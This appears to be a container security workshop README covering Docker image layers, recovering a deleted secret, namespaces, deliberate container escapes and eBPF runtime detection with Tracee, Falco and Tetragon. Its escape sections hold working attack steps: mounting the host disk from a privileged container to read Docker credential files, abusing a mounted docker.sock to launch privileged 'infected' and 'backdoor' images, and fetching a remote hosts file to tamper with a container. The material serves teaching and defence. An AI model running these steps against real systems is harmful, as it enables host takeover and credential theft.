# Dissecting containers and pods

A hands-on lab that takes a container apart from the outside in. We start by
running plain `nginx` containers, then build our own images and pull them apart
layer by layer, look at where a running container actually lives on the host,
walk through the Linux primitives (namespaces, capabilities, cgroups) that make
a "container" a container, break out of a few deliberately misconfigured ones,
watch the kernel with eBPF tooling, and finish with the same ideas applied to
Kubernetes pods.

The goal is not to memorise commands but to build a mental model: **a container
is just a normal Linux process with a private view of the filesystem, network,
and process tree, assembled from stacked read-only image layers plus one
writable layer on top.** Once that clicks, both the "how do I inspect it" and
the "how do I escape it" parts stop being magic.

> **A note on modern Docker.** Recent Docker Engine ships with the
> **containerd image store** enabled by default. This changes a few things you
> will see below — most importantly, `docker inspect` no longer fills in the old
> `GraphDriver` block, and image storage moves from `/var/lib/docker/overlay2/`
> to the containerd snapshotter tree. Where it matters, both the "classic" and
> the "containerd" layouts are shown. You can check which store you are on with:
>
> ```
> docker info | grep -iE 'storage|driver'
> ```
>
> If you see `driver-type: io.containerd.snapshotter.v1` you are on the new
> containerd store; if you see `Storage Driver: overlay2` you are on the classic
> one.

## Running containers is easy
### Docker host
- ubuntu machine
- public ip address
- security group 80, 443, 8080, 8081

### Install docker
`jq` and `tree` make the rest of the lab much easier to follow — `jq` for
slicing the JSON that `docker inspect` produces, `tree` for visualising the
unpacked image layers.

```
sudo apt-get update
sudo apt-get install -y jq tree 
```
```
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh ./get-docker.sh
```

Adding your user to the `docker` group lets you run the client without `sudo`.
Note that this is effectively **root-equivalent** — anyone in the `docker` group
can mount the host filesystem into a container, so treat group membership as an
administrative privilege.

```
sudo groupadd docker
sudo usermod -aG docker $USER
newgrp docker
```
### Running our first container
Each `docker run` below starts an nginx web server and publishes its internal
port 80 on a different host port. Because the two containers use different image
tags (1.24 and 1.25) they also pull different image layers, which is handy later
when we compare layer digests.

```
export IP="x.x.x.x"
```
```
docker run -d -p 8080:80 --name www nginx:1.24
```
```
docker run -d -p 8081:80 --name www2 nginx:1.25
```
```
curl -kv $IP:8080
```
```
curl -kv $IP:8081
```
## Creating images
An image is a stack of read-only layers plus a small JSON config describing how
to run it. Every instruction in a `Dockerfile` that changes the filesystem
(`ADD`, `COPY`, `RUN`) produces a new layer. Layers are content-addressed and
shared between images, which is why the second image we build reuses most of the
first one's bytes.

### a first image
The example below hides a deliberate mistake that we will exploit in the
"Dissecting the image" section: it copies a secret into the image, then deletes
it in a later layer. Deleting a file does **not** remove it from the earlier
layer where it was added — the layer is immutable. The delete only writes a
"whiteout" marker in a newer layer that hides the file at runtime. The bytes are
still there for anyone who unpacks the layers.

```
mkdir ./lab1
cd lab1
```
```
echo "My Annacon secret" >./secret.txt
```
```
cat >Dockerfile <<EOF
FROM ubuntu:20.04
ADD ./secret.txt /secret.txt
RUN apt-get update && apt-get install -y curl netcat
RUN  rm -f /secret.txt
CMD bash
EOF
```
```
docker build -t myimage ./.
```
```
docker run -it myimage
```

#### (Optional) Push to a registry
Everything in this lab works with **locally built** images, so pushing to a
registry is entirely optional. Do it only if you want to share the image between
hosts or pull it on another machine. If you skip this, just keep using the local
`myimage` tag in the following steps.

```
# optional — requires a Docker Hub (or other registry) account
docker tag myimage xxradar/myimage:01
docker login
docker push xxradar/myimage:01
docker run -it xxradar/myimage:01
```
### a second image using the first as base
Here we build a new image *on top of* the first one. If you pushed `myimage` to a
registry you can use that reference as the base; otherwise just build `FROM` the
local tag — Docker resolves it from your local image store without any network
access.

```
mkdir ../lab2
cd ../lab2
```
```
cat >Dockerfile <<EOF
FROM myimage
RUN apt-get update && apt-get install -y dnsutils tcpdump
CMD tcpdump -i any
EOF
```

> If you pushed the first image and prefer to base off the registry copy,
> replace the first line with `FROM xxradar/myimage:01`.

```
docker build -t mytcpdumper ./.
```
```
docker run -it mytcpdumper
```

#### (Optional) Push the second image
```
# optional
docker tag mytcpdumper xxradar/mytcpdumper:01
docker push xxradar/mytcpdumper:01
docker run -it xxradar/mytcpdumper:01
```
## Dissecting the image
`docker save` serialises an image — all of its layers and metadata — into a
single tar stream. This is the offline, registry-free way to inspect exactly
what ships inside an image.

```
mkdir ../lab3
cd ../lab3
```
```
docker save myimage >image.tar
```
```
tar xfv ./image.tar
```

**What you get depends on the image store.** The on-disk format of the saved tar
changed with the containerd image store, so look at what actually landed in the
directory:

```
tree .
```

- **Classic (overlay2) format:** a top-level `manifest.json`, one `<hash>.json`
  config file, and one directory per layer, each containing a `layer.tar`.

  ```
  cat manifest.json | jq
  ```

- **Containerd / OCI format:** an `oci-layout` marker, an `index.json`, and a
  `blobs/sha256/` directory. Every blob — image config, manifest, *and* each
  layer — is a file named after its digest under `blobs/sha256/`. The config
  and manifest blobs are JSON; the layer blobs are (usually gzip-compressed)
  tarballs.

  ```
  cat index.json | jq
  cat oci-layout | jq
  ```

### Finding `secret.txt`
The lesson: the secret we "deleted" in the Dockerfile is still recoverable,
because it lives in the layer where it was `ADD`ed. To prove it, unpack every
layer into its own directory and search across all of them.

Classic format — each layer is a `layer.tar`:
```
for d in */ ; do
  [ -f "$d/layer.tar" ] && mkdir -p "extract/$d" && tar xf "$d/layer.tar" -C "extract/$d"
done
grep -Rl secret.txt ./extract/ 2>/dev/null
```

Containerd / OCI format — layers are blobs under `blobs/sha256/`. Not every blob
is a tar (the config and manifest are JSON), so probe each one before unpacking:
```
mkdir -p extract
i=0
for blob in blobs/sha256/* ; do
  # only unpack blobs that are actually tar archives
  if tar -tf "$blob" >/dev/null 2>&1 ; then
    i=$((i+1))
    mkdir -p "extract/layer_$i"
    tar -xf "$blob" -C "extract/layer_$i" 2>/dev/null
  fi
done
grep -Rl secret.txt ./extract/ 2>/dev/null
find ./extract -name secret.txt
```

> A ready-made helper script that handles both layouts (and can save the image
> for you) is a convenient way to do this in one shot — see the community
> `extract-image-blobs.sh` pattern, or just reuse the loops above.

### Vulnerability scanners
Unpacking layers by hand is great for understanding; in practice you run a
scanner. `trivy` reads the same layers, matches installed packages against
vulnerability databases, and can also flag secrets and misconfigurations.

```
wget https://github.com/aquasecurity/trivy/releases/download/v0.45.1/trivy_0.45.1_Linux-64bit.deb
sudo dpkg -i trivy_0.45.1_Linux-64bit.deb
```
```
trivy image myimage
```
```
# trivy can also flag embedded secrets like the one above:
trivy image --scanners secret myimage
```
## Dissecting a running container
So far we have looked at images (static, on-disk artefacts). A **running
container** is different: it is a live process, with a merged root filesystem
and a set of kernel namespaces. Everything `docker inspect` prints comes from
querying that live process and its configuration.

```
mkdir ../lab4
cd ../lab4
```
```
docker inspect www
```
### Storage
`docker inspect` exposes where the daemon keeps the container's logs and its
filesystem. Start with the log path — this is the JSON-lines file that backs
`docker logs`:

```
docker inspect www | jq -r '.[].LogPath'
```
```
# it is owned by root, so:
sudo tail $(docker inspect www | jq -r '.[].LogPath')
```

Now the filesystem. **This is where the classic and containerd stores diverge**,
and it is the single most common source of "the tutorial doesn't match my
machine" confusion.

**Classic (overlay2) store.** `docker inspect` fills in a `GraphDriver` block
that points straight at the overlay directories. The `UpperDir` is the
container's writable layer — anything the process writes at runtime lands there.

```
docker inspect www | jq -r '.[].GraphDriver'
# -> shows LowerDir / MergedDir / UpperDir under /var/lib/docker/overlay2/...
```
```
UPPER=$(docker inspect www | jq -r '.[].GraphDriver.Data.UpperDir')
sudo ls -l "$UPPER"
```

**Containerd store (modern default).** Here `GraphDriver` is **`null`** — the
same thing you will see on a fresh Docker install today:

```
docker inspect www | jq -r '.[].GraphDriver'
null
```
```
docker inspect www | jq -r '.[].Driver'
# -> overlayfs   (the containerd overlayfs snapshotter)
```

Because the snapshot path is not exposed in `inspect`, the reliable way to find
the writable layer is through the running **process** instead. Grab the PID from
inspect and read its mount table — the overlay mount lists `lowerdir`,
`upperdir`, and `workdir` directly:

```
PID=$(docker inspect www | jq -r '.[].State.Pid')
sudo grep -w overlay /proc/$PID/mountinfo
# -> ...upperdir=/var/lib/docker/containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/<N>/fs...
```

The snapshots live under:

```
sudo ls /var/lib/docker/containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots/
```

**Proving it, both stores.** Write a file inside the container and find it on the
host. The simplest, store-agnostic trick is to walk in through the process root
(`/proc/<PID>/root` is the container's merged filesystem as seen from the host):

```
docker exec -it www bash
```
```
echo secretoftheday > /text.txt
exit
```
```
# store-agnostic: reach the file directly via the process root
PID=$(docker inspect www | jq -r '.[].State.Pid')
sudo cat /proc/$PID/root/text.txt          # -> secretoftheday
```
```
# or locate it in the writable upperdir on disk:
sudo find /var/lib/docker/containerd/daemon/io.containerd.snapshotter.v1.overlayfs/snapshots \
     -name text.txt 2>/dev/null
# (classic store: look under the UpperDir from GraphDriver instead)
```

The key takeaway: **runtime writes go only to the container's private writable
layer**, never back into the shared read-only image layers. That is why the
`text.txt` you just created shows up in the snapshot upperdir but would *not*
appear if you unpacked the image blobs — it was never part of the image.

If you just want the whole merged filesystem as one flat tarball without hunting
for snapshots, `docker export` gives you exactly that:

```
docker export www -o www-rootfs.tar
```
### Processes and namespaces
A container's isolation is built from Linux **namespaces**: separate views of
the process tree (`pid`), network stack (`net`), mounts (`mnt`), hostname
(`uts`), IPC, and more. From the host you can see these as namespace IDs on the
container's main process, and you can find every process that shares a given
namespace.

```
mkdir ../lab5
cd ../lab5
```
```
export PID=$(docker inspect www | jq -r '.[].State.Pid')
echo $PID
```

List the namespace IDs attached to the container's process. Two processes in the
same namespace share the same numeric ID, so this is how you tell "who is in the
same sandbox":

```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep $PID
```

Take the network namespace ID from the previous output and list everything that
shares it — you should see the container's processes grouped together:

```
export NETNS="4026532287"
```
```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep $NETNS
```
### Entering a container
`nsenter` joins an existing set of namespaces by PID — it is the low-level
equivalent of `docker exec`, but it works directly against the kernel so it does
not depend on the Docker CLI at all. Once inside, you are running as if you were
a process in that container.

```
nsenter -t $PID -a
```
```
apt-get update && apt-get install procps
```
```
ps aux
```

From inside, you have the container's network identity. The steps below tamper
with the running nginx to show that you now control what it serves:

```
curl https://www.radarhack.com/dir/demo/hosts.txt -o /etc/hosts
```
```
curl www.google.com
```
```
cat /usr/share/nginx/html/index.html
```
```
echo hacking at annacon >> /usr/share/nginx/html/index.html
```
```
curl -kv 127.0.0.1:8080
```
### Privileged
A `--privileged` container keeps almost all Linux capabilities and gets access
to host devices. That combination is enough to escape: because the host's block
devices are visible inside the container, you can simply mount the host root
filesystem and read (or write) anything on it — including credentials.

First see which block devices are exposed:

```
lsblk
```
```
docker run -d  --privileged  --name www3 nginx:1.25
```
```
docker exec -it www3 bash
```

Mount the host's root disk inside the container. The device name depends on the
`lsblk` output above (`/dev/vda1`, `/dev/xvda1`, `/dev/root`, etc.):

```
mkdir /tmp/host-fs
# mount /dev/root /tmp/host-fs/
mount /dev/vda1 /tmp/host-fs/
```

Now the entire host filesystem is under `/tmp/host-fs`. A classic prize is the
Docker client config, which can contain registry credentials:

```
cd  /tmp/host-fs/
# cat /tmp/host-fs/root/.docker/config.json
# cat /tmp/host-fs/home/ubuntu/.docker/config.json
```

**Takeaway:** never run untrusted workloads with `--privileged`. It is not a
"slightly stronger" container — it is effectively root on the host.

### Mounting issues
Mounting the Docker socket (`/var/run/docker.sock`) into a container hands that
container full control of the Docker daemon — and therefore the host. Anything
that can talk to the socket can launch new containers, including privileged ones
that mount the host filesystem. This is one of the most common real-world
misconfigurations.

```
docker run -d  -v /var/run/docker.sock:/var/run/docker.sock --name www4 nginx:1.25
```
```
docker exec -it www4 bash
```

Download a static Docker client and point it at the mounted socket. From here
you are effectively the host's Docker daemon:

```
curl https://download.docker.com/linux/static/stable/x86_64/docker-24.0.6.tgz -O
tar xzvf ./docker-24.0.6.tgz
cd docker
./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock run -d --name hackpod xxradar/hackon sleep 900
./docker -H unix:///var/run/docker.sock run -d --privileged --name hackpodpriv xxradar/ubuntu_infected:annacon  sleep 500 &
./docker -H unix:///var/run/docker.sock run -d --privileged  -v /var/run/docker.sock:/var/run/docker.sock --name hackpod_backdoor xxradar/ubuntu_infected:annacon  "bash -c sleep 500 &"
```
```
apt list
```
### PID
Sharing the host PID namespace (`--pid host`) drops the process-tree isolation:
the container can see — and, with the right capabilities, signal or inspect —
every process on the host.

```
docker run -it --rm --pid host xxradar/hackon
```
### Host network driver
`--net host` removes network isolation entirely: the container shares the host's
network interfaces and localhost. Any service bound to `127.0.0.1` on the host is
now reachable from the container, which often exposes admin endpoints that were
assumed to be host-only.

```
docker run -it --rm --net host xxradar/hackon
```
### Notes
Useful odds and ends for poking at namespaces and capabilities:

```
findmnt -N $PID
sudo cat  /proc/24302/mountinfo

sudo filecap /usr/bin/ping
sudo filecap -a 2>/dev/null

pscap
sysctl net.ipv4.ip_unprivileged_port_start
ls -la /proc/sys/net/ipv4/

https://github.com/genuinetools/amicontained (TBC)
```
## eBPF
Everything above inspects containers from user space. **eBPF** lets you observe
(and enforce policy on) container behaviour from *inside the kernel* — syscalls,
network connections, process execution — with very low overhead. The three tools
below are runtime security/observability agents built on eBPF. They all run
privileged and share host namespaces because they need kernel-wide visibility.

### Tracee
Aqua's Tracee traces syscalls and security events across the whole host:

```
docker run   --name tracee --rm -it   \
   --pid=host \
   --cgroupns=host \
   --privileged \
   -v /etc/os-release:/etc/os-release-host:ro \
   aquasec/tracee:latest
```
### Falco
Falco matches kernel events against a rule set and alerts on suspicious
behaviour. Install it, then load a tiny rule that fires whenever a process is
spawned inside a container named `falco-test`:

```
sudo curl -s https://falco.org/repo/falcosecurity-packages.asc |sudo  apt-key add -

sudo echo "deb https://download.falco.org/packages/deb stable main" | sudo tee -a /etc/apt/sources.list.d/falcosecurity.list

sudo  apt-get update -y

sudo apt-get install -y falco
```
```
- rule: spawned_process_in_test_container
  desc: A process was spawned in the test container.
  condition: container.name = "falco-test" and evt.type = execve
  output: "%evt.time,%user.uid,%proc.name,%container.id,%container.name,command=%proc.cmdline"
  priority: WARNING
```
```
falco -r ./falco.rule
....
```
### Tetragon
Cilium's Tetragon does both observability *and* enforcement. First just watch
events:

```
docker run -d --name tetragon-container --rm --pull always \
    --pid=host \
    --cgroupns=host \
    --privileged             \
    -v /sys/kernel/btf/vmlinux:/var/lib/tetragon/btf    \
    quay.io/cilium/tetragon-ci:latest
```
```
docker exec tetragon-container tetra getevents -o compact
```

Now a **TracingPolicy** that not only reports but actively kills any `curl`
process that tries to connect anywhere outside loopback — a concrete example of
in-kernel enforcement:

```
cat > ./tracing_policy.yaml <<EOF
# This tracing policy 'connect-only-local-addrs' will report attempts
# to make outbound TCP connections to any IP address other than those
# within the 127.0.0.0/8 CIDR, from the binary /usr/bin/curl. In
# addition it will also kill the offending curl process.
#
# Description:
#  Report and block outbound TCP connections outside loopback from
#  /usr/bin/curl.
#
# In production, this could be used to force processes to only connect
# to their side cars on their local loopback, and to treat transgressions
# as evidence of malicious activity, resulting in the process being
# killed.

apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "connect-only-local-addrs"
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "127.0.0.0/8"
      matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/curl"
      matchActions:
      - action: Sigkill
EOF
```
```
docker run -d --name tetragon-container --rm --pull always \
    --pid=host --cgroupns=host --privileged             \
    -v $PWD/tracing_policy.yaml:/tracing_policy.yaml    \
    -v /sys/kernel/btf/vmlinux:/var/lib/tetragon/btf    \
    quay.io/cilium/tetragon-ci:latest                   \
    --tracing-policy /tracing_policy.yaml
```
## Running pods is easy
Kubernetes builds on the exact same primitives. A **pod** is a group of
containers that *share* some namespaces — most notably the network namespace (so
they share an IP and can talk over `localhost`) and any declared volumes — while
keeping separate mount and (by default) PID namespaces. The "pause" container you
will see on the node is what holds those shared namespaces open.

### Create a multi-container pod
This pod runs nginx and redis side by side, sharing an `emptyDir` volume mounted
at different paths in each container — a minimal illustration of how sidecars
share storage:

```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: mcpod
spec:
  volumes:
  - name: demo
    emptyDir: {}
  containers:
  - name: nginx
    image: nginx
    volumeMounts:
    - name: demo
      mountPath: /demo
  - name: redis
    image: redis
    volumeMounts:
    - name: demo
      mountPath: /data
EOF
```
```
kubectl get po -o wide
```

On the node, the same namespace inspection from lab5 applies. Find the pod's
processes by PID, then confirm that the two containers share a network namespace
but not a mount namespace:

```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep <PID>
```
```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep <NETNS>
```
```
apt-get update && apt-get install procps
```

